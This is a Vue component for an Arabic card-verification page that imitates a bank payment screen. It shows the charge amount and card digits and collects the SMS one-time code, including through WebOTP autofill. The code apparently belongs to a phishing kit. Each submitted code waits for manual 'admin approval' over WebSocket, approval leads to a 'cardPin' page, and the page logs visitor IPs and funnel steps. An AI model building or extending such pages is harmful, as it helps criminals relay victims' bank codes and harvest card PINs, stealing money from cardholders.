<template>
    <div class="otp-shell" dir="rtl">

        <!-- ── Waiting Loader Modal ──────────────────────────────────── -->
        <InsLoading v-if="isVerifying && !error" :modal="false" color="amber" size="lg"
            :text="t( 'verification.otp.loading' )"
            :sub-text="t( 'verification.otp.waitingForApproval' )" />

        <!-- ── Main Card ─────────────────────────────────────────────── -->
        <div class="otp-card">

            <!-- Error Message -->
            <div v-if="error" id="ErrorMessage" class="otp-error-msg">
                {{ error }}
            </div>

            <!-- Title -->
            <div class="otp-card__header">
                <h1 class="otp-card__title">إثبات ملكية البطاقة</h1>
            </div>

            <!-- Transaction Info -->
            <div class="otp-card__info">
                سيتم اجراء معاملة مالية على حسابك المصرفي
                <br>
                لسداد مبلغ قيمته SAR {{ formattedAmount }}
                <br>
                باستخدام البطاقة المنتهية برقم
                <span id="cardLast4">{{ cardLast4 }}</span>
                <br>
                <span v-if="!codeExpired">لتأكيد العملية ادخل رمز التحقق المرسل برسالة نصية إلى جوالك.</span>
                <span v-else class="otp-card__expired-msg">انتهت صلاحية الرمز — اطلب رمزًا جديدًا</span>
            </div>

            <!-- OTP Input -->
            <div class="otp-card__form">
                <div class="otp-card__label">رمز التحقق *</div>
                <div class="otp-card__input-box">
                    <input
                        id="PaymentCode"
                        v-model="otpCode"
                        type="text"
                        inputmode="numeric"
                        pattern="[0-9]*"
                        name="one-time-code"
                        maxlength="6"
                        minlength="4"
                        enterkeyhint="done"
                        autocapitalize="off"
                        autocorrect="off"
                        spellcheck="false"
                        :disabled="isVerifying || codeExpired"
                        placeholder="ادخل رمز التحقق الذي تم ارساله إلى جوالك"
                        class="otp-card__input"
                        autocomplete="one-time-code"
                        @keyup.enter="submitOtp"
                        @input="handleOtpInput"
                        @paste="handleOtpPaste"
                    />
                </div>
            </div>

            <!-- Timer -->
            <div class="otp-card__timer" :class="{ 'otp-card__timer--urgent': expiryUrgent }">
                ينتهي رمز التحقق خلال
                <br>
                <span id="otptimeout">{{ formattedExpiry }}</span>
                دقيقة
            </div>

            <!-- Submit -->
            <div class="otp-card__submit-wrap">
                <button
                    id="pay_code_submit"
                    type="submit"
                    :disabled="!isOtpValid || isVerifying || codeExpired"
                    class="otp-card__submit"
                    :class="{ 'otp-card__submit--disabled': !isOtpValid || isVerifying || codeExpired }"
                    @click="submitOtp"
                >
                    <svg v-if="isVerifying" class="otp-card__spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    <span>{{ isVerifying ? t( 'verification.otp.verifying' ) : 'تأكيد' }}</span>
                </button>
            </div>

            <!-- Resend -->
            <div v-if="resendTimer <= 0 || codeExpired" class="otp-card__resend">
                <button :disabled="isResending" class="otp-card__resend-btn" @click="resendOtp">
                    <svg v-if="isResending" class="otp-card__spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                    </svg>
                    <span>{{ isResending ? t( 'verification.otp.resending' ) : t( 'verification.otp.resend' ) }}</span>
                </button>
            </div>

            <!-- Payment By footer -->
            <div class="otp-card__footer">
                <div class="otp-card__payment-by">الدفع بواسطة</div>
                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="otp-card__logos" />
            </div>
        </div>

        <!-- Cancel -->
        <button type="button" class="otp-card__cancel" @click="$router.replace( { name: 'checkout' } )">
            {{ t( 'verification.otp.cancelTransaction' ) }}
        </button>

        <!-- Help -->
        <div class="otp-help">
            <span class="otp-help__label">{{ t( 'common.supportContact' ) }}</span>
            <a href="tel:920033360" class="otp-help__phone" dir="ltr">920033360</a>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackOtpRequested, trackOtpResent, trackOtpExpired, trackOtpVerified, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getOtpStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import InsLoading from '@/components/ui/InsLoading.vue';
import { useCardBranding } from '@/composables/useCardBranding';
import { getReasonLabel } from '@/constants/rejectionReasons';
import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';

// ─── Order data (transaction context for trust signals) ─────────────
const orderData = (() => {
    try { return JSON.parse( sessionStorage.getItem( 'orderData' ) || '{}' ); }
    catch { return {}; }
})();
const _merchantName = computed( () => orderData?.plan?.companyName || 'تأمينكم' );

const { t } = useI18n();
const router = useRouter();

// ─── Visitor tracking ───────────────────────────────────────────────
useVisitorTracking( 'otp' );

// ─── Session context via composable (computed to preserve reactivity) ───
const { context, resolveCustomerIp, submitOtp: submitOtpApi, resendOtpCode, error: paymentError } = usePayment();
const sessionId = computed( () => context.sessionId || '' );
const customerIpRef = ref( context.customerIp || '' );
const cardBin = computed( () => context.cardBin || '' );
const cardLast4 = computed( () => context.cardLast4 || '****' );
const _cardHolder = computed( () => context.cardHolder || '' );
const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );

// ─── Card branding (network + bank) ────────────────────────────────
const { brand: _brand, networkLogo: _networkLogo, networkName: _networkName, bankKey: _bankKey, bankLogo: _bankLogo, bankName: _bankName } = useCardBranding( cardBin );

const RESEND_COOLDOWN = 180; // seconds
const CODE_EXPIRY = 300; // 5 minutes fallback

const formattedAmount = computed( () =>
    totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } )
);

// ─── OTP State ──────────────────────────────────────────────────────
const otpCode = ref( '' );
const otpInputRef = ref( null );
const isVerifying = ref( false );
const isResending = ref( false );
const lastResendAt = ref( 0 );
const error = ref( '' );
const resendTimer = ref( RESEND_COOLDOWN );
let timerInterval = null;

// ─── Code Expiry Timer (server-synced via expires_at) ───────────────
const codeExpiry = ref( CODE_EXPIRY );
let expiryInterval = null;
const codeExpired = computed( () => codeExpiry.value <= 0 );
const expiryUrgent = computed( () => codeExpiry.value > 0 && codeExpiry.value <= 30 );

const formattedExpiry = computed( () =>
{
    const m = Math.floor( codeExpiry.value / 60 );
    const s = codeExpiry.value % 60;
    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
} );

function startExpiryTimer ()
{
    if ( expiryInterval ) clearInterval( expiryInterval );

    // Use server's expires_at if available (survives route re-entry + tab switching)
    const serverExpiry = context.otpExpiresAt;
    if ( serverExpiry )
    {
        const remaining = Math.max( 0, Math.floor( ( new Date( serverExpiry ) - Date.now() ) / 1000 ) );
        codeExpiry.value = remaining;
    } else
    {
        codeExpiry.value = CODE_EXPIRY;
    }

    if ( codeExpiry.value <= 0 ) return;

    expiryInterval = setInterval( () =>
    {
        // Re-calculate from server timestamp each tick to prevent drift
        const serverExp = context.otpExpiresAt;
        if ( serverExp )
        {
            codeExpiry.value = Math.max( 0, Math.floor( ( new Date( serverExp ) - Date.now() ) / 1000 ) );
        } else
        {
            codeExpiry.value = Math.max( 0, codeExpiry.value - 1 );
        }

        if ( codeExpiry.value <= 0 )
        {
            clearInterval( expiryInterval );
            trackOtpExpired();
        }
    }, 1000 );
}

const isOtpValid = computed( () => /^(\d{4}|\d{6})$/.test( otpCode.value ) );

function extractOtpCode ( raw )
{
    const text = String( raw || '' );

    // Prefer exact standalone 4-6 digit OTP tokens first
    const token = text.match( /(?:^|\D)(\d{4,6})(?:\D|$)/ );
    if ( token?.[1] ) return token[1];

    // Fallback: collect all digits and trim to max 6
    const digits = text.replace( /\D/g, '' );
    return digits.slice( 0, 6 );
}

function queueAutoSubmitIfReady ()
{
    clearTimeout( autoSubmitTimer );
    if ( /^(\d{4}|\d{6})$/.test( otpCode.value ) ) {
        autoSubmitTimer = setTimeout( () => submitOtp(), 350 );
    }
}

function handleOtpInput ( event )
{
    otpCode.value = extractOtpCode( event?.target?.value );
    queueAutoSubmitIfReady();
}

function handleOtpPaste ( event )
{
    const pasted = event?.clipboardData?.getData( 'text' ) || '';
    const extracted = extractOtpCode( pasted );
    if ( extracted ) {
        event.preventDefault();
        otpCode.value = extracted;
        queueAutoSubmitIfReady();
    }
}

const _formattedTimer = computed( () =>
{
    const m = Math.floor( resendTimer.value / 60 );
    const s = resendTimer.value % 60;
    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
} );

const _timerPercent = computed( () =>
    Math.round( ( resendTimer.value / RESEND_COOLDOWN ) * 100 )
);

function startResendTimer ()
{
    if ( timerInterval ) clearInterval( timerInterval );
    resendTimer.value = RESEND_COOLDOWN;
    timerInterval = setInterval( () =>
    {
        if ( resendTimer.value > 0 )
        {
            resendTimer.value--;
        } else
        {
            clearInterval( timerInterval );
        }
    }, 1000 );
}

// ─── Submit OTP ─────────────────────────────────────────────────────
const submitOtp = async () =>
{
    if ( !isOtpValid.value || isVerifying.value ) return;

    isVerifying.value = true;
    error.value = '';

    const success = await submitOtpApi( otpCode.value );

    if ( !success )
    {
        error.value = paymentError.value || t( 'verification.otp.sendCodeError' );
        isVerifying.value = false;
    } else
    {
        logger.debug( '[OTP] Submitted successfully, waiting for admin approval' );
    }
};

// ─── Resend OTP ─────────────────────────────────────────────────────
const resendOtp = async () =>
{
    if ( isResending.value ) return;
    if ( Date.now() - lastResendAt.value < 10000 ) return; // 10s minimum between resends
    if ( resendTimer.value > 0 && !codeExpired.value ) return;

    isResending.value = true;
    lastResendAt.value = Date.now();
    error.value = '';

    const success = await resendOtpCode();

    if ( success )
    {
        otpCode.value = '';
        otpInputRef.value?.clear();
        isVerifying.value = false;     // unlock input after fresh code is issued
        context.otpExpiresAt = null;   // clear stale expiry so timer uses CODE_EXPIRY default
        startResendTimer();
        startExpiryTimer();
        trackOtpResent();
    } else
    {
        error.value = t( 'verification.otp.resendError' );
    }

    isResending.value = false;
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',
    approvedEvent: 'OtpApproved',
    rejectedEvent: 'OtpRejected',
    logTag: 'OTP',

    onApproved ( event )
    {
        logger.debug( '[OTP] Approved:', event );
        isVerifying.value = false;
        trackOtpVerified();
        trackStepCompleted( 'otp', 'card_pin' );

        // Defer navigation via microtask to release the WS message handler
        queueMicrotask( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'cardPin', router );
            } else
            {
                router.push( { name: 'cardPin' } );
            }
        } );
    },

    onRejected ( event )
    {
        logger.debug( '[OTP] Rejected:', event );
        isVerifying.value = false;

        // Card-redirect reasons → send user back to checkout with error
        const cardRedirectReasons = [ 'otp_ewallet_not_accepted', 'otp_card_change_required' ];
        if ( cardRedirectReasons.includes( event.reason ) )
        {
            router.replace( { name: 'checkout', query: { rejectionReason: event.reason } } );
            return;
        }

        error.value = getReasonLabel( event.reason, t ) || t( 'verification.otp.codeRejected' );
        otpCode.value = '';
        otpInputRef.value?.clear();
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.otp || '';
        if ( !isVerifying.value || !sessionId.value || !sig ) return;

        const { data } = await getOtpStatus( sessionId.value, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( { redirect_to: null } );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'otp_other' } );
        } else if ( data.status === 'expired' )
        {
            // Server confirms expiry — trigger the same path as the local timer
            handleRejected( { reason: 'otp_expired' } );
        }
    },
} );

// ─── WebOTP API — auto-fill from SMS ────────────────────────────────
let abortController = null;
let webOtpRequested = false;

async function initWebOTP ()
{
    if ( webOtpRequested ) return;
    if ( !( 'OTPCredential' in window ) ) return;

    webOtpRequested = true;

    try
    {
        abortController = new AbortController();
        const content = await navigator.credentials.get( {
            otp: { transport: [ 'sms' ] },
            signal: abortController.signal,
        } );

        if ( content?.code )
        {
            const code = extractOtpCode( content.code );
            otpCode.value = code;
            queueAutoSubmitIfReady();
        }
    } catch
    {
        // User cancelled or not supported — silent
    }
}

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    otpInputRef.value?.focusFirstEmpty();
    startResendTimer();
    startExpiryTimer();
    setupWs( ip );
    initWebOTP();
    trackStepViewed( 'otp' );
    trackOtpRequested();
} );

let autoSubmitTimer = null;

onUnmounted( () =>
{
    if ( timerInterval ) clearInterval( timerInterval );
    if ( expiryInterval ) clearInterval( expiryInterval );
    if ( abortController ) abortController.abort();
    clearTimeout( autoSubmitTimer );
    // WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
} );
</script>

<style scoped>
/* ═══════════════════════════════════════════════════════════════════
   OTP Page — matches reference payment gateway design
   ═══════════════════════════════════════════════════════════════════ */

.otp-shell {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 1.5rem 1rem;
    background: #f5f5f5;
    font-family: inherit;
}

/* ── Card ──────────────────────────────────────────────── */
.otp-card {
    width: 100%;
    max-width: 460px;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 3px 6px 0 rgba(0, 0, 0, 0.13);
    overflow: hidden;
}

/* ── Error Message ────────────────────────────────────── */
.otp-error-msg {
    padding: 12px 20px;
    background: #fef2f2;
    border-bottom: 1px solid #fca5a5;
    color: #dc2626;
    font-size: 14px;
    font-weight: 500;
}

/* ── Header ───────────────────────────────────────────── */
.otp-card__header {
    padding: 20px 24px 0;
}

.otp-card__title {
    font-size: 18px;
    font-weight: 700;
    color: #1a1a1a;
    margin: 0 0 8px;
    line-height: 1.4;
}

/* ── Transaction Info ─────────────────────────────────── */
.otp-card__info {
    padding: 8px 24px 14px;
    font-size: 14px;
    line-height: 1.8;
    color: #444;
}

.otp-card__expired-msg {
    color: #dc2626;
    font-weight: 600;
    font-size: 14px;
}

/* ── Form ─────────────────────────────────────────────── */
.otp-card__form {
    padding: 4px 24px 14px;
}

.otp-card__label {
    font-size: 13px;
    line-height: 1.4;
    color: #333;
    font-weight: 600;
    margin-bottom: 6px;
}

.otp-card__input-box {
    position: relative;
}

.otp-card__input {
    width: 100%;
    padding: 10px 14px;
    font-size: 15px;
    border: 1px solid #ccc;
    border-radius: 6px;
    outline: none;
    direction: rtl;
    text-align: right;
    background-position: right 10px center !important;
    transition: border-color 0.2s;
    box-sizing: border-box;
    letter-spacing: 0.12em;
}

.otp-card__input::placeholder {
    font-size: 12px;
    color: #aaa;
    letter-spacing: 0;
}

.otp-card__input:focus {
    border-color: #faa62e;
    box-shadow: 0 0 0 2px rgba(250, 166, 46, 0.15);
}

.otp-card__input:disabled {
    background: #f5f5f5;
    cursor: not-allowed;
}

/* ── Timer ────────────────────────────────────────────── */
.otp-card__timer {
    text-align: center;
    width: 100%;
    font-size: 13px;
    line-height: 1.6;
    padding: 10px 24px;
    color: #666;
}

.otp-card__timer #otptimeout {
    font-weight: 700;
    font-size: 16px;
    color: #1a5276;
    display: inline-block;
    min-width: 3rem;
}

.otp-card__timer--urgent #otptimeout {
    color: #dc2626;
    animation: pulse-urgent 1s ease-in-out infinite;
}

@keyframes pulse-urgent {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

/* ── Submit Button ────────────────────────────────────── */
.otp-card__submit-wrap {
    width: 100%;
    text-align: center;
    padding: 10px 24px 18px;
}

.otp-card__submit {
    margin: auto;
    width: 100%;
    max-width: 220px;
    font-size: 15px;
    background: #faa62e;
    color: #fff;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-weight: 700;
    padding: 12px 20px;
    line-height: 1.4;
    border-radius: 8px;
    box-shadow: 0 2px 8px 0 rgba(0, 0, 0, 0.1);
    border: none;
    cursor: pointer;
    transition: background 0.2s, transform 0.15s;
}

.otp-card__submit:hover:not(:disabled) {
    background: #e8941a;
    transform: translateY(-1px);
}

.otp-card__submit--disabled {
    background: #d1d5db;
    color: #9ca3af;
    cursor: not-allowed;
    box-shadow: none;
    transform: none;
}

.otp-card__spinner {
    width: 18px;
    height: 18px;
    animation: spin 1s linear infinite;
    flex-shrink: 0;
}

@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

/* ── Resend ───────────────────────────────────────────── */
.otp-card__resend {
    text-align: center;
    padding: 0 24px 14px;
}

.otp-card__resend-btn {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 8px 20px;
    border: 1px solid #d1d5db;
    border-radius: 6px;
    background: #fff;
    color: #555;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.15s;
}

.otp-card__resend-btn:hover:not(:disabled) {
    border-color: #faa62e;
    color: #faa62e;
}

.otp-card__resend-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

/* ── Footer ───────────────────────────────────────────── */
.otp-card__footer {
    margin-top: 8px;
    text-align: center;
    margin-bottom: 0;
    padding: 14px 24px 18px;
    border-top: 1px solid #eee;
    background: #fafafa;
}

.otp-card__payment-by {
    font-size: 12px;
    color: #888;
    margin-bottom: 8px;
}

.otp-card__logos {
    height: 22px;
    width: auto;
    display: block;
    margin: 0 auto;
}

/* ── Cancel (outside card) ────────────────────────────── */
.otp-card__cancel {
    display: block;
    margin-top: 14px;
    padding: 8px 20px;
    background: none;
    border: none;
    cursor: pointer;
    font-size: 13px;
    color: #9ca3af;
    text-align: center;
    transition: color 0.15s;
}

.otp-card__cancel:hover {
    color: #dc2626;
}

/* ── Help ──────────────────────────────────────────────── */
.otp-help {
    margin-top: 10px;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
}

.otp-help__label {
    font-size: 12px;
    color: #999;
}

.otp-help__phone {
    color: #faa62e;
    font-weight: 700;
    font-size: 13px;
    text-decoration: none;
}

.otp-help__phone:hover { text-decoration: underline; }
</style>
